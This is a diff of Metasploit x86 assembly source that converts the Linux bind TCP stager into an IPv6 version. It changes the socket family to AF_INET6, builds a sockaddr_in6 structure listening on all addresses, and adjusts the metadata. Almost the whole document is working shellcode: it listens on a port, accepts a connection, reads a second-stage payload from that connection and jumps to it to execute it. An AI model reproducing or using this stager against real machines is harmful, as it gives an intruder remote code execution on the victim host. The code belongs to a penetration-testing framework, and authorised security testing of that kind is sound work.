@@ -1,6 +1,6 @@
 ;;
 ;
-;        Name: stager_sock_bind
+;        Name: stager_sock_bind6
 ;   Qualities: Can Have Nulls
 ;     Version: $Revision: 1607 $
 ;     License:
@@ -8,8 +8,6 @@
 ;        This file is part of the Metasploit Exploit Framework
 ;        and is subject to the same licenses and copyrights as
 ;        the rest of this package.
-;
-;        With enhancements from the unixasm project by Ramon de Carvalho Valle
 ;
 ; Description:
 ;
@@ -21,14 +19,13 @@
 ;
 ; meta-shortname=Linux Bind TCP Stager
 ; meta-description=Listen on a port for a connection and run a second stage
-; meta-authors=skape <mmiller [at] hick.org>
+; meta-authors=skape <mmiller [at] hick.org>; egypt <egypt [at] metasploit.com>
 ; meta-os=linux
 ; meta-arch=ia32
 ; meta-category=stager
 ; meta-connection-type=bind
-; meta-name=bind_tcp
+; meta-name=bind_ipv6_tcp
 ; meta-path=lib/Msf/PayloadComponent/Linux/ia32/BindStager.pm
-; meta-offset-lport=0x14
 ;;
 BITS   32
 GLOBAL _start
@@ -54,7 +51,7 @@ socket:
 	push ebx           ; protocol = 0 = first that matches this type and domain, i.e. tcp
 	inc  ebx           ; 1 = SYS_SOCKET
 	push ebx           ; type     = 1 = SOCK_STREAM
-	push byte 0x2      ; domain   = 2 = AF_INET
+	push byte 0xa      ; domain   = 0xa = AF_INET6
 	mov  ecx, esp      ; socketcall args
 	mov  al, 0x66      ; __NR_socketcall
 	int  0x80
@@ -63,14 +60,20 @@ socket:
 
 ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 bind:
-	pop  ebx           ; 2 = SYS_BIND (this was PF_INET for the call to socket)
-	pop  esi           ; 1 = junk - this keeps ecx pointing to the right place
+	inc  ebx           ; 2 = SYS_BIND (this was PF_INET for the call to socket)
 	; set up the sockaddr
-	push edx           ; addr->sin_addr = 0 = inet_addr("0.0.0.0")
-	push 0xbfbf0002    ; addr->sin_port = 0xbfbf
-	                   ; addr->sin_family = 2 = AF_INET
-	push byte 0x10     ; addrlen
-	push ecx           ; addr (ecx still points to the right place on the stack)
+
+	push edx           ; addr->sin6_scopeid = 0
+	push edx           ; addr->sin6_addr = inet_pton("::0")
+	push edx           ; ...
+	push edx           ; ...
+	push edx           ; ...
+	push edx           ; addr->flowinfo = 0
+	push 0xbfbf000a    ; addr->sin6_port = 0xbfbf
+	                   ; addr->sin6_family = 0xa = AF_INET6
+	mov  ecx, esp      ; socketcall args
+	push byte 0x1c     ; addrlen
+	push ecx           ; addr
 	push eax           ; sockfd ; return value from socket(2) above
 	mov  ecx, esp      ; socketcall args
 	push byte 0x66     ; __NR_socketcall
@@ -82,42 +85,25 @@ listen:
 	mov  al, 0x66      ; __NR_socketcall
 	int  0x80
 
-; At this point the stack will look like this:
-;
-; [ sockfd         ]  <-- esp, ecx
-; [ addr           ]  # pointer to below on the stack
-; [ addrlen = 0x66 ]
-; [ 0xbfbf0002     ]  <-- *addr
-; [ 0x00000000     ]  inet_addr("0.0.0.0")
-;
-; Since addrlen is ignored if addr is null, we can set esp+4 to NULL and use
-; the sockfd that's already on the stack as an argument to accept(2), thus
-; avoiding having to set up a full list of args. Conveniently,
-;    mov [ecx+4], edx
-; is three bytes long, whereas the old sequence:
-;    push edx           ; addr = NULL
-;    push edx           ; addrlen = NULL
-;    push esi           ; sockfd
-;    mov  ecx, esp      ; socketcall args
-; weighs in at 5
-
-
 ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 accept:
 	inc  ebx           ; 5 = SYS_ACCEPT
 	mov  al, 0x66      ; __NR_socketcall
 	mov  [ecx+4], edx
 	int  0x80
-	xchg eax, ebx      ; client socket is now in ebx
+	xchg eax, ebx
 
 %ifndef USE_SINGLE_STAGE
 
+; ssize_t read(int fd, void *buf, size_t count);
 recv:
-	mov  dh, 0xc
-	mov  al, 0x3
+	; fd  = ebx
+	; buf = ecx is pointing somewhere in the stack
+	mov  dh, 0xc       ; count = 0xc00
+	mov  al, 0x3       ; __NR_read
 	int  0x80
-	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi
-	                 ; for fd
+	mov  edi, ebx      ; not necessary if second stages use ebx instead of edi
+	                   ; for fd
 	jmp  ecx
 
 %else
